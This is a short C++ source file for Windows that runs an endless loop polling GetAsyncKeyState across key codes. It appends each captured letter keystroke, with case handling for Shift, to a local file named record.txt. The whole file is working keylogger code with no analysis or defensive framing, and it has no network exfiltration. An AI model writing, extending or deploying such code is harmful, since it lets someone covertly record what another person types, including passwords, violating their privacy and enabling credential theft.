#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

void log();
int main() {
    log();
    return 0;
}

void log(){
    char key;

    while (true){ //endless loop
        for (key = 8; key <= 222; key++){
            if (GetAsyncKeyState(key) == -32767){
                ofstream  write ("record.txt", ios::app);

                if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10))) {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                } else if ((key > 64) && (key < 91)){
                    write << key;
                    write.close();
                    break;
                }
            }

        }
    }
}